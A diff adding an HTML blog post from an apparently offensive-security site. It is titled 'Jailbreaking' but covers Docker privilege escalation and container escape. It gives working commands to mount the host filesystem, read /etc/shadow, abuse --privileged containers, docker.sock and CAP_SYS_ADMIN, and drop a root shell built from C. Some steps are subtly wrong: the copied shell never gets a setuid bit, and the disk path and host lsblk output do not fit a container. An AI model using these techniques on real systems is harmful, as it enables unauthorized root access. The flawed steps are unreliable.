@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Jailbreaking :: offsec1337</title>
+  <link rel="stylesheet" href="../css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body data-base="../">
+  <nav class="topnav">
+    <div class="brand"><span class="accent">offsec</span>1337<span class="caret">_</span></div>
+    <div class="nav-right">
+      <ul class="nav-links">
+        <li><a href="../index.html">home</a></li>
+        <li><a href="../about.html">about</a></li>
+      </ul>
+      <div class="nav-search" id="nav-search">
+        <button class="search-toggle" id="search-toggle" aria-label="Search posts" title="Search">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="11" cy="11" r="7"/><line x1="21" y1="21" x2="16.4" y2="16.4"/></svg>
+        </button>
+        <div class="search-panel" id="search-panel">
+          <input type="text" id="search-input" placeholder="search posts..." autocomplete="off">
+          <div class="search-results" id="search-results">
+            <div class="search-hint">// start typing to search posts</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </nav>
+
+  <div class="wrap">
+    <a class="back-link" href="../index.html">&larr; back to all posts</a>
+
+    <article class="post-full">
+      <div class="date">Aug 22, 2026</div>
+      <h1>Jailbreaking</h1>
+
+      <div class="post-body">
+
+        <!-- Write your post below using plain HTML tags:
+             <p>...</p>                 - normal paragraph
+             <h2>...</h2> / <h3>...</h3> - section headings
+             <ul><li>...</li></ul>       - bullet list
+             <ol><li>...</li></ol>       - numbered list
+             <blockquote>...</blockquote> - highlighted quote/callout
+             <pre><code>...</code></pre> - monospace code block
+             <img src="../img/posts/filename.png" alt="..."> - image
+                (put image files in the img/posts/ folder first)
+                <a href="https://github.com/fortra/impacket" target="_blank" rel="noopener">Impacket</a>
+        -->
+
+        <h1>Docker priveleg escalation</h1>
+        <p><b>1) </b>If local user is a member of docker group on linux we can use that to abuse docker permission to escalate our privilege to root:</p>
+        <pre><code>docker run -v /:/mnt -it example</code></pre>
+        <p>You need to use avialbe docker container id or name instead of "example" for above command. <br>Above command mounts entire file system into /mnt directory and gives us root docker shell which we can use /mnt directory to read or write entire operating system.</p>
+        <p>For example in this case /etc/shadow file can be accessed as: /mnt/etc/shadow or /root directory as /mtn/root.</p>
+        <p><b>2) </b>We cano also use <code>--privileged</code> flag to lower container security. The <code>--privileged</code> flag significantly lowers container security, offering unrestricted device access and bypassing several protections.</p>
+        <p>For example:</p>
+        <pre><code>docker run --rm --privileged -it example sh</code></pre>
+        <p><b>3) </b>Above two examples requires you to already have docker containers running, but now we can learn how to abuse docker permission with creating our own container</p>
+        <p>First wirte this shell.c code:</p>
+        <pre><code>#include <unistd.h>
+#include <stdlib.h>
+
+int main() {
+    setuid(0);
+    system("/bin/sh");
+    return 0;
+}</code></pre>
+        <p>and compile using gcc:</p>
+        <pre><code>gcc -o shell shell.c</code></pre>
+        <h3>Second step create Dockerfile</h3>
+        <p>Dockerfile:</p>
+        <pre><code>FROM alpine:latest
+COPY shellscript.sh /shellscript.sh
+COPY shell /shell
+RUN chmod +x /shellscript.sh</code></pre>
+<h3>Third step create shellscript.sh file</h3>
+<p>shellscript.sh:</p>
+<pre><code>#!/bin/bash
+cp /shell /shared/shell
+chmod 755 /shared/shell
+</code></pre>
+<p>Now we need to build our container. To do that we need to place our 3 above files into 1 empty directory which we should have all 3 files (Dockerfile, shellscript.sh, shell) in our directory and issue this command to build:</p>
+<pre><code>docker build --rm -t test:latest .</code></pre>
+<p>Next we need to run conatiner by mounting /tmp directory</p>
+<pre><code>docker run -v /tmp/:/shared/ test:latest /bin/sh /shellscript.sh</code></pre>
+<p>After running the container go to /tmp directory on host and execute shell file:</p>
+<pre><code>cd /tmp
+./shell</code></pre>
+<p>If all the steps followed correctly our shell code should execute with elevated privilege.</p>
+<h1> Escaping from docker container</h1>
+<p>If we land a docker shell where we inside docker container there is various possible technique where we can escape from docker shell.</p>
+<h3>Docker escape 1 - Abusing exposed docker socket</h3>
+<p>Searching exposed docker sockets:</p>
+<pre><code>find / -name "docker.sock" 2>/dev/null</code></pre>
+<p>If we find docker image:</p>
+<pre><code>docker run -v /:/mnt --rm -it example /bin/bash</code></pre>
+<p>We used another container to mount host file system into /mnt directory. Like first example it's another escape technique.</p>
+<h3>Docker escap 2 - Abusing <code>CAP_SYS_ADMIN</code> capability</h3>
+<p>If we have CAP_SYS_ADMIN capability we can mount disk to specific directory to access entire machine files while staying inside docker shell.</p>
+<p>Checking capabilities of docker:</p>
+<pre><code>root@2225bfdee7ec:~# capsh --print | grep cap_sys_admin
+Current: = cap_chown, cap_sys_module, cap_sys_chroot, cap_sys_admin, cap_setgid,cap_setuid
+<-- snip --></code></pre>
+<p><code>capsh --print</code> revealed we have <code>cap_sys_admin</code> capabilitiy.</p>
+<p>First we need to identifiy disk using <code>lsblk</code></p>
+<pre><code>┌──(lobo㉿berserk)-[~]
+└─$ lsblk
+NAME        MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS
+nvme0n1     259:0    0 238.5G  0 disk 
+├─nvme0n1p1 259:1    0   976M  0 part /boot/efi
+├─nvme0n1p2 259:2    0 225.2G  0 part /
+└─nvme0n1p3 259:3    0  12.3G  0 part [SWAP]</code></pre>
+<p>Here we can see my disk file: /nvme0n1/nvme0n1p2 which I can mount that while staying in docker container with this command:</p>
+<pre><code>mount /nvme0n1/nvme0n1p2 /mnt</code></pre>
+<p>Other linux machines you may see different disk name like /dev/sda1, important part is you need to look at mountpoints in my case nvme0n1p2 mounted to /</p>
+<h1>Restricted shell escape</h1>
+<p>With it's own name it is restricted shell we can not even use full capabilities of normal user with restricted shell often known as <code>rbash</code></p>
+      </div>
+    </article>
+  </div>
+
+  <div class="footer">offsec1337 &copy; 2026 &mdash; stay legal, hack responsibly.</div>
+
+  <script>
+    document.querySelectorAll('.post-body img').forEach(function (img) {
+      img.addEventListener('error', function () { img.classList.add('broken-img'); });
+    });
+  </script>
+  <script src="../js/search.js"></script>
+</body>
+</html>
